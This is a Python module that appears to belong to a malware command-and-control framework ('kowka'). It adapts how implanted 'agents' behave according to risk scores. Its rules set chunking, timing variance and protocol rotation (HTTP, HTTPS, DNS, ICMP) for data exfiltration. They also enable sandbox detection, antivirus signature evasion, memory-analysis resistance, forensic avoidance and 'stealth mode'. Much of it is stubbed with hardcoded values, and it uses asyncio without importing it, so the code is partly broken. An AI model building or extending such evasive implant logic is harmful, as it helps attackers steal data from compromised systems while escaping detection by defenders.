"""
Behavioral adaptation and machine learning engine
Advanced pattern recognition and adaptive response system
"""

import logging
import numpy as np
import json
from typing import Dict, List, Optional, Tuple
from datetime import datetime, timedelta
from collections import defaultdict, deque
import statistics
import hashlib

class BehavioralAdaptationEngine:
    """Adapts agent behavior based on environmental patterns, threats, and ML analysis"""
    
    def __init__(self):
        self.logger = logging.getLogger('kowka.behavioral')
        self.agent_profiles = {}
        self.environmental_baselines = {}
        self.threat_models = {}
        self.adaptation_rules = {}
        self.learning_data = defaultdict(lambda: defaultdict(deque))
        self.pattern_detectors = {}
        self.operational = False
        
        self._initialize_adaptation_rules()
        self._initialize_pattern_detectors()
    
    def _initialize_adaptation_rules(self):
        """Initialize behavioral adaptation rules and thresholds"""
        self.adaptation_rules = {
            'checkin_frequency': {
                'normal_range': (300, 1800),  # 5-30 minutes
                'high_risk_increase': 1.5,     # 50% more frequent
                'low_risk_decrease': 0.7,      # 30% less frequent
                'emergency_threshold': 60,     # 1 minute for emergencies
                'learning_window': 24          # hours to analyze
            },
            'data_exfiltration': {
                'max_chunk_size': 1048576,     # 1MB chunks
                'stealth_threshold': 524288,   # 512KB stealth mode
                'timing_variance': 0.3,        # 30% timing variation
                'protocol_rotation': 4,        # rotate every 4 transfers
            },
            'network_behavior': {
                'port_rotation': True,
                'protocol_diversity': ['HTTP', 'HTTPS', 'DNS', 'ICMP'],
                'traffic_shaping': True,
                'bandwidth_limits': (1024, 10485760)  # 1KB to 10MB
            },
            'security_evasion': {
                'sandbox_detection': True,
                'av_signature_evasion': True,
                'memory_analysis_resistance': True,
                'forensic_avoidance': True
            }
        }
    
    def _initialize_pattern_detectors(self):
        """Initialize machine learning pattern detectors"""
        self.pattern_detectors = {
            'temporal_analysis': TemporalPatternAnalyzer(),
            'anomaly_detection': AnomalyDetectionEngine(),
            'threat_correlation': ThreatCorrelationEngine(),
            'behavioral_clustering': BehavioralClusteringEngine()
        }
    
    async def initialize(self) -> bool:
        """Initialize behavioral adaptation engine"""
        try:
            # Load historical data and establish baselines
            await self._load_historical_data()
            await self._establish_environmental_baselines()
            
            # Start continuous learning loop
            asyncio.create_task(self._continuous_learning_loop())
            
            self.operational = True
            self.logger.info("Behavioral adaptation engine initialized")
            return True
            
        except Exception as e:
            self.logger.error(f"Behavioral adaptation initialization failed: {str(e)}")
            return False
    
    async def _load_historical_data(self):
        """Load historical behavioral data for pattern analysis"""
        # In production, this would load from database
        # For demo, initialize with empty structures
        self.learning_data = defaultdict(lambda: defaultdict(deque))
    
    async def _establish_environmental_baselines(self):
        """Establish baseline behavioral patterns for the environment"""
        self.environmental_baselines = {
            'network_latency': {
                'mean': 150,    # ms
                'std_dev': 50,
                'percentile_95': 250
            },
            'checkin_regularity': {
                'mean_interval': 900,  # 15 minutes
                'variance': 0.25,      # 25% variation
                'missed_checkins': 0.02  # 2% missed rate
            },
            'system_activity': {
                'normal_hours': [9, 17],  # 9 AM - 5 PM
                'peak_usage': [13, 15],   # 1 PM - 3 PM
                'weekend_factor': 0.3     # 30% of weekday activity
            }
        }
    
    async def analyze_agent_behavior(self, agent_id: str, behavior_data: Dict) -> Dict:
        """
        Analyze agent behavior and recommend adaptations
        Returns adaptation recommendations and risk assessment
        """
        try:
            # Update learning data
            self._update_learning_data(agent_id, behavior_data)
            
            # Run pattern analysis
            analysis_results = await self._run_pattern_analysis(agent_id, behavior_data)
            
            # Assess risk level
            risk_assessment = await self._assess_risk_level(agent_id, analysis_results)
            
            # Generate adaptation recommendations
            adaptations = await self._generate_adaptations(agent_id, analysis_results, risk_assessment)
            
            # Update agent profile
            self._update_agent_profile(agent_id, analysis_results, risk_assessment)
            
            self.logger.debug(f"Behavior analysis complete for agent {agent_id}, risk: {risk_assessment['level']}")
            
            return {
                'risk_assessment': risk_assessment,
                'adaptation_recommendations': adaptations,
                'pattern_insights': analysis_results.get('insights', []),
                'confidence_score': analysis_results.get('confidence', 0.0)
            }
            
        except Exception as e:
            self.logger.error(f"Behavior analysis failed for agent {agent_id}: {str(e)}")
            return self._get_default_recommendations()
    
    def _update_learning_data(self, agent_id: str, behavior_data: Dict):
        """Update learning data with new behavior observations"""
        timestamp = datetime.utcnow()
        
        # Store checkin patterns
        if 'checkin_interval' in behavior_data:
            self.learning_data[agent_id]['checkin_intervals'].append(
                (timestamp, behavior_data['checkin_interval'])
            )
            # Keep only last 100 samples
            if len(self.learning_data[agent_id]['checkin_intervals']) > 100:
                self.learning_data[agent_id]['checkin_intervals'].popleft()
        
        # Store network behavior
        if 'network_metrics' in behavior_data:
            self.learning_data[agent_id]['network_behavior'].append(
                (timestamp, behavior_data['network_metrics'])
            )
            if len(self.learning_data[agent_id]['network_behavior']) > 50:
                self.learning_data[agent_id]['network_behavior'].popleft()
        
        # Store system interactions
        if 'system_interactions' in behavior_data:
            self.learning_data[agent_id]['system_behavior'].append(
                (timestamp, behavior_data['system_interactions'])
            )
            if len(self.learning_data[agent_id]['system_behavior']) > 200:
                self.learning_data[agent_id]['system_behavior'].popleft()
    
    async def _run_pattern_analysis(self, agent_id: str, behavior_data: Dict) -> Dict:
        """Run comprehensive pattern analysis using all detectors"""
        analysis_results = {
            'temporal_patterns': {},
            'anomalies': [],
            'threat_indicators': [],
            'behavioral_clusters': {},
            'insights': [],
            'confidence': 0.0
        }
        
        try:
            # Temporal pattern analysis
            temporal_data = self._extract_temporal_features(agent_id, behavior_data)
            analysis_results['temporal_patterns'] = (
                self.pattern_detectors['temporal_analysis'].analyze(temporal_data)
            )
            
            # Anomaly detection
            feature_vector = self._create_feature_vector(agent_id, behavior_data)
            analysis_results['anomalies'] = (
                self.pattern_detectors['anomaly_detection'].detect(feature_vector)
            )
            
            # Threat correlation
            analysis_results['threat_indicators'] = (
                self.pattern_detectors['threat_correlation'].correlate(behavior_data)
            )
            
            # Behavioral clustering
            analysis_results['behavioral_clusters'] = (
                self.pattern_detectors['behavioral_clustering'].cluster(agent_id, behavior_data)
            )
            
            # Generate insights
            analysis_results['insights'] = self._generate_insights(analysis_results)
            
            # Calculate confidence score
            analysis_results['confidence'] = self._calculate_confidence(analysis_results)
            
        except Exception as e:
            self.logger.error(f"Pattern analysis failed for agent {agent_id}: {str(e)}")
        
        return analysis_results
    
    def _extract_temporal_features(self, agent_id: str, behavior_data: Dict) -> Dict:
        """Extract temporal features for pattern analysis"""
        checkin_intervals = [interval for _, interval in self.learning_data[agent_id]['checkin_intervals']]
        
        features = {
            'checkin_regularity': {
                'mean_interval': statistics.mean(checkin_intervals) if checkin_intervals else 900,
                'std_dev': statistics.stdev(checkin_intervals) if len(checkin_intervals) > 1 else 0,
                'trend': self._calculate_trend(checkin_intervals),
                'hourly_pattern': self._analyze_hourly_pattern(agent_id)
            },
            'seasonality': {
                'daily_cycle': self._detect_daily_cycle(agent_id),
                'weekly_cycle': self._detect_weekly_cycle(agent_id)
            }
        }
        
        return features
    
    def _calculate_trend(self, data: List[float]) -> float:
        """Calculate trend using linear regression (simplified)"""
        if len(data) < 2:
            return 0.0
        
        x = list(range(len(data)))
        y = data
        
        # Simple linear trend calculation
        n = len(x)
        sum_x = sum(x)
        sum_y = sum(y)
        sum_xy = sum(xi * yi for xi, yi in zip(x, y))
        sum_x2 = sum(xi * xi for xi in x)
        
        try:
            slope = (n * sum_xy - sum_x * sum_y) / (n * sum_x2 - sum_x * sum_x)
            return slope
        except ZeroDivisionError:
            return 0.0
    
    def _analyze_hourly_pattern(self, agent_id: str) -> Dict:
        """Analyze hourly activity patterns"""
        # Simplified implementation
        # In production, this would analyze actual timestamp data
        return {
            'peak_hours': [9, 14, 20],  # 9AM, 2PM, 8PM
            'activity_level': 'MODERATE',
            'consistency_score': 0.75
        }
    
    def _detect_daily_cycle(self, agent_id: str) -> Dict:
        """Detect daily activity cycles"""
        return {
            'cycle_detected': True,
            'peak_activity': [10, 16],  # 10AM-4PM
            'low_activity': [2, 6],     # 2AM-6AM
            'confidence': 0.8
        }
    
    def _detect_weekly_cycle(self, agent_id: str) -> Dict:
        """Detect weekly activity patterns"""
        return {
            'weekday_activity': 0.85,   # 85% of activity on weekdays
            'weekend_activity': 0.15,   # 15% on weekends
            'busiest_day': 'Wednesday',
            'confidence': 0.7
        }
    
    def _create_feature_vector(self, agent_id: str, behavior_data: Dict) -> np.ndarray:
        """Create feature vector for anomaly detection"""
        features = []
        
        # Checkin pattern features
        checkin_data = self.learning_data[agent_id]['checkin_intervals']
        if checkin_data:
            intervals = [interval for _, interval in checkin_data]
            features.extend([
                np.mean(intervals) if intervals else 900,
                np.std(intervals) if len(intervals) > 1 else 0,
                len(intervals)
            ])
        else:
            features.extend([900, 0, 0])
        
        # Network behavior features
        if 'network_metrics' in behavior_data:
            net_metrics = behavior_data['network_metrics']
            features.extend([
                net_metrics.get('latency', 100),
                net_metrics.get('bandwidth_used', 0),
                net_metrics.get('packet_loss', 0)
            ])
        else:
            features.extend([100, 0, 0])
        
        # System interaction features
        if 'system_interactions' in behavior_data:
            sys_data = behavior_data['system_interactions']
            features.extend([
                sys_data.get('process_count', 0),
                sys_data.get('user_activity', 0),
                sys_data.get('file_operations', 0)
            ])
        else:
            features.extend([0, 0, 0])
        
        return np.array(features)
    
    def _generate_insights(self, analysis_results: Dict) -> List[str]:
        """Generate actionable insights from analysis results"""
        insights = []
        
        # Temporal insights
        temporal = analysis_results.get('temporal_patterns', {})
        if temporal.get('checkin_regularity', {}).get('trend', 0) > 10:
            insights.append("Checkin frequency increasing - consider adjusting intervals")
        
        # Anomaly insights
        anomalies = analysis_results.get('anomalies', [])
        if len(anomalies) > 2:
            insights.append(f"Multiple anomalies detected ({len(anomalies)}) - increased vigilance recommended")
        
        # Threat insights
        threats = analysis_results.get('threat_indicators', [])
        if threats:
            insights.append(f"Threat indicators detected: {', '.join(threats[:3])}")
        
        # Behavioral insights
        clusters = analysis_results.get('behavioral_clusters', {})
        if clusters.get('cluster_changes', 0) > 0:
            insights.append("Behavioral pattern shift detected - adaptation may be needed")
        
        return insights
    
    def _calculate_confidence(self, analysis_results: Dict) -> float:
        """Calculate overall confidence score for analysis"""
        confidence_factors = []
        
        # Temporal analysis confidence
        temporal = analysis_results.get('temporal_patterns', {})
        if temporal:
            confidence_factors.append(0.8)
        
        # Anomaly detection confidence
        anomalies = analysis_results.get('anomalies', [])
        confidence_factors.append(max(0.5, 1.0 - len(anomalies) * 0.1))
        
        # Data volume confidence
        data_points = sum(len(deque) for deque in self.learning_data.values())
        data_confidence = min(1.0, data_points / 1000)  # More data = more confidence
        confidence_factors.append(data_confidence)
        
        return statistics.mean(confidence_factors) if confidence_factors else 0.5
    
    async def _assess_risk_level(self, agent_id: str, analysis_results: Dict) -> Dict:
        """Assess comprehensive risk level for agent"""
        risk_score = 0.0
        risk_factors = []
        
        # Checkin pattern risk
        temporal = analysis_results.get('temporal_patterns', {})
        regularity = temporal.get('checkin_regularity', {})
        if regularity.get('std_dev', 0) > 300:  # High variance
            risk_score += 0.2
            risk_factors.append("Irregular checkin pattern")
        
        # Anomaly risk
        anomalies = analysis_results.get('anomalies', [])
        risk_score += min(0.5, len(anomalies) * 0.1)
        if anomalies:
            risk_factors.append(f"{len(anomalies)} behavioral anomalies")
        
        # Threat indicator risk
        threats = analysis_results.get('threat_indicators', [])
        risk_score += min(0.7, len(threats) * 0.15)
        if threats:
            risk_factors.append(f"{len(threats)} threat indicators")
        
        # Environmental risk
        env_risk = await self._assess_environmental_risk(agent_id)
        risk_score += env_risk
        if env_risk > 0.3:
            risk_factors.append("High environmental risk")
        
        # Determine risk level
        if risk_score >= 0.7:
            risk_level = 'CRITICAL'
        elif risk_score >= 0.5:
            risk_level = 'HIGH'
        elif risk_score >= 0.3:
            risk_level = 'MEDIUM'
        elif risk_score >= 0.1:
            risk_level = 'LOW'
        else:
            risk_level = 'MINIMAL'
        
        return {
            'level': risk_level,
            'score': round(risk_score, 3),
            'factors': risk_factors,
            'timestamp': datetime.utcnow().isoformat()
        }
    
    async def _assess_environmental_risk(self, agent_id: str) -> float:
        """Assess environmental risk factors"""
        # Simplified environmental risk assessment
        # In production, this would analyze network environment, security controls, etc.
        current_hour = datetime.utcnow().hour
        
        # Higher risk during business hours
        if 9 <= current_hour <= 17:
            return 0.2
        else:
            return 0.1
    
    async def _generate_adaptations(self, agent_id: str, analysis_results: Dict, risk_assessment: Dict) -> List[Dict]:
        """Generate behavioral adaptation recommendations"""
        adaptations = []
        risk_level = risk_assessment['level']
        
        # Checkin frequency adaptations
        checkin_adaptation = self._adapt_checkin_frequency(agent_id, risk_level)
        if checkin_adaptation:
            adaptations.append(checkin_adaptation)
        
        # Network behavior adaptations
        network_adaptation = self._adapt_network_behavior(risk_level)
        if network_adaptation:
            adaptations.append(network_adaptation)
        
        # Security evasion adaptations
        security_adaptation = self._adapt_security_evasion(risk_level, analysis_results)
        if security_adaptation:
            adaptations.append(security_adaptation)
        
        # Data handling adaptations
        data_adaptation = self._adapt_data_handling(risk_level)
        if data_adaptation:
            adaptations.append(data_adaptation)
        
        return adaptations
    
    def _adapt_checkin_frequency(self, agent_id: str, risk_level: str) -> Dict:
        """Adapt checkin frequency based on risk level"""
        base_interval = 900  # 15 minutes
        
        if risk_level == 'CRITICAL':
            new_interval = int(base_interval * 0.3)  # 70% more frequent
            return {
                'type': 'checkin_frequency',
                'action': 'DECREASE_INTERVAL',
                'parameters': {'interval': new_interval},
                'reason': 'Critical risk level requires increased monitoring',
                'priority': 'HIGH'
            }
        elif risk_level == 'HIGH':
            new_interval = int(base_interval * 0.6)  # 40% more frequent
            return {
                'type': 'checkin_frequency',
                'action': 'DECREASE_INTERVAL',
                'parameters': {'interval': new_interval},
                'reason': 'High risk level requires closer monitoring',
                'priority': 'HIGH'
            }
        elif risk_level == 'LOW':
            new_interval = int(base_interval * 1.5)  # 50% less frequent
            return {
                'type': 'checkin_frequency',
                'action': 'INCREASE_INTERVAL',
                'parameters': {'interval': new_interval},
                'reason': 'Low risk level allows reduced monitoring',
                'priority': 'LOW'
            }
        
        return None
    
    def _adapt_network_behavior(self, risk_level: str) -> Dict:
        """Adapt network behavior based on risk level"""
        if risk_level in ['HIGH', 'CRITICAL']:
            return {
                'type': 'network_behavior',
                'action': 'ENABLE_STEALTH_MODE',
                'parameters': {
                    'traffic_shaping': True,
                    'protocol_rotation': True,
                    'bandwidth_limit': 102400,  # 100KB/s
                    'chunk_size': 51200         # 50KB chunks
                },
                'reason': f'Enhanced stealth required for {risk_level} risk',
                'priority': 'HIGH'
            }
        
        return None
    
    def _adapt_security_evasion(self, risk_level: str, analysis_results: Dict) -> Dict:
        """Adapt security evasion techniques"""
        threats = analysis_results.get('threat_indicators', [])
        
        if any('sandbox' in threat.lower() for threat in threats):
            return {
                'type': 'security_evasion',
                'action': 'ENABLE_SANDBOX_EVASION',
                'parameters': {
                    'environment_checks': True,
                    'timing_analysis': True,
                    'hardware_detection': True
                },
                'reason': 'Sandbox environment detected',
                'priority': 'HIGH'
            }
        
        return None
    
    def _adapt_data_handling(self, risk_level: str) -> Dict:
        """Adapt data handling procedures"""
        if risk_level in ['HIGH', 'CRITICAL']:
            return {
                'type': 'data_handling',
                'action': 'ENABLE_EMERGENCY_PROTOCOLS',
                'parameters': {
                    'immediate_exfiltration': False,
                    'data_compression': True,
                    'encryption_enhancement': True,
                    'cleanup_interval': 3600  # 1 hour
                },
                'reason': f'Emergency data handling for {risk_level} risk',
                'priority': 'HIGH'
            }
        
        return None
    
    def _update_agent_profile(self, agent_id: str, analysis_results: Dict, risk_assessment: Dict):
        """Update comprehensive agent profile"""
        if agent_id not in self.agent_profiles:
            self.agent_profiles[agent_id] = {
                'created': datetime.utcnow(),
                'risk_history': [],
                'adaptation_history': [],
                'behavioral_baseline': {}
            }
        
        profile = self.agent_profiles[agent_id]
        
        # Update risk history
        profile['risk_history'].append({
            'timestamp': datetime.utcnow(),
            'level': risk_assessment['level'],
            'score': risk_assessment['score'],
            'factors': risk_assessment['factors']
        })
        
        # Keep only last 100 risk assessments
        if len(profile['risk_history']) > 100:
            profile['risk_history'] = profile['risk_history'][-100:]
        
        # Update behavioral baseline
        profile['behavioral_baseline'] = {
            'last_analysis': datetime.utcnow(),
            'checkin_pattern': analysis_results.get('temporal_patterns', {}),
            'anomaly_count': len(analysis_results.get('anomalies', [])),
            'confidence_score': analysis_results.get('confidence', 0.0)
        }
    
    def _get_default_recommendations(self) -> Dict:
        """Get default recommendations when analysis fails"""
        return {
            'risk_assessment': {
                'level': 'UNKNOWN',
                'score': 0.5,
                'factors': ['Analysis unavailable'],
                'timestamp': datetime.utcnow().isoformat()
            },
            'adaptation_recommendations': [{
                'type': 'general',
                'action': 'MAINTAIN_CURRENT',
                'parameters': {},
                'reason': 'Behavioral analysis unavailable',
                'priority': 'LOW'
            }],
            'pattern_insights': ['Behavioral analysis temporarily unavailable'],
            'confidence_score': 0.0
        }
    
    async def _continuous_learning_loop(self):
        """Continuous learning and model improvement loop"""
        while self.operational:
            try:
                await asyncio.sleep(3600)  # Run every hour
                await self._update_learning_models()
                await self._prune_old_data()
                
            except Exception as e:
                self.logger.error(f"Continuous learning error: {str(e)}")
                await asyncio.sleep(600)  # Wait 10 minutes on error
    
    async def _update_learning_models(self):
        """Update machine learning models with new data"""
        # This would retrain ML models in production
        # For demo, we'll just log the activity
        total_data_points = sum(
            len(deque) 
            for agent_data in self.learning_data.values() 
            for deque in agent_data.values()
        )
        
        self.logger.info(f"Learning models updated with {total_data_points} data points")
    
    async def _prune_old_data(self):
        """Prune old learning data to prevent memory exhaustion"""
        cutoff_time = datetime.utcnow() - timedelta(days=30)  # Keep 30 days
        
        for agent_id in list(self.learning_data.keys()):
            for data_type in list(self.learning_data[agent_id].keys()):
                # Remove old entries
                self.learning_data[agent_id][data_type] = deque(
                    item for item in self.learning_data[agent_id][data_type] 
                    if item[0] > cutoff_time
                )
                
                # Remove empty data types
                if not self.learning_data[agent_id][data_type]:
                    del self.learning_data[agent_id][data_type]
            
            # Remove agents with no data
            if not self.learning_data[agent_id]:
                del self.learning_data[agent_id]
    
    async def get_agent_behavior_summary(self, agent_id: str) -> Dict:
        """Get comprehensive behavior summary for agent"""
        if agent_id not in self.agent_profiles:
            return {'error': 'Agent profile not found'}
        
        profile = self.agent_profiles[agent_id]
        
        return {
            'agent_id': agent_id,
            'profile_created': profile['created'].isoformat(),
            'current_risk': profile['risk_history'][-1] if profile['risk_history'] else None,
            'risk_trend': self._calculate_risk_trend(profile['risk_history']),
            'data_points': {
                data_type: len(deque) 
                for data_type, deque in self.learning_data.get(agent_id, {}).items()
            },
            'behavioral_baseline': profile.get('behavioral_baseline', {}),
            'adaptation_count': len(profile.get('adaptation_history', []))
        }
    
    def _calculate_risk_trend(self, risk_history: List[Dict]) -> str:
        """Calculate risk trend from history"""
        if len(risk_history) < 2:
            return 'STABLE'
        
        recent_scores = [assessment['score'] for assessment in risk_history[-5:]]
        if len(recent_scores) < 2:
            return 'STABLE'
        
        trend = statistics.mean(np.diff(recent_scores))
        
        if trend > 0.1:
            return 'INCREASING'
        elif trend < -0.1:
            return 'DECREASING'
        else:
            return 'STABLE'
    
    async def emergency_shutdown(self):
        """Emergency shutdown of behavioral adaptation engine"""
        self.operational = False
        self.logger.info("Behavioral adaptation engine shutdown complete")


# Supporting ML Classes (Simplified implementations)

class TemporalPatternAnalyzer:
    """Analyzes temporal patterns in agent behavior"""
    
    def analyze(self, temporal_data: Dict) -> Dict:
        return {
            'checkin_regularity': temporal_data.get('checkin_regularity', {}),
            'seasonality': temporal_data.get('seasonality', {}),
            'pattern_confidence': 0.85,
            'trend_direction': 'STABLE'
        }

class AnomalyDetectionEngine:
    """Detects behavioral anomalies using statistical methods"""
    
    def detect(self, feature_vector: np.ndarray) -> List[str]:
        anomalies = []
        
        # Simple threshold-based anomaly detection
        if len(feature_vector) >= 3 and feature_vector[0] < 300:  # Very frequent checkins
            anomalies.append("Unusually frequent checkins")
        
        if len(feature_vector) >= 6 and feature_vector[3] > 500:  # High latency
            anomalies.append("Network latency anomaly")
        
        return anomalies

class ThreatCorrelationEngine:
    """Correlates behavior with known threat patterns"""
    
    def correlate(self, behavior_data: Dict) -> List[str]:
        threats = []
        
        # Simple pattern matching
        if behavior_data.get('system_interactions', {}).get('suspicious_processes', 0) > 2:
            threats.append("Multiple suspicious processes")
        
        if behavior_data.get('network_metrics', {}).get('unusual_ports', 0) > 0:
            threats.append("Unusual network port activity")
        
        return threats

class BehavioralClusteringEngine:
    """Clusters behavioral patterns for classification"""
    
    def cluster(self, agent_id: str, behavior_data: Dict) -> Dict:
        return {
            'current_cluster': 'NORMAL_OPERATIONS',
            'cluster_confidence': 0.92,
            'cluster_changes': 0,
            'similar_agents': []  # Would contain similar agent IDs in production
        }
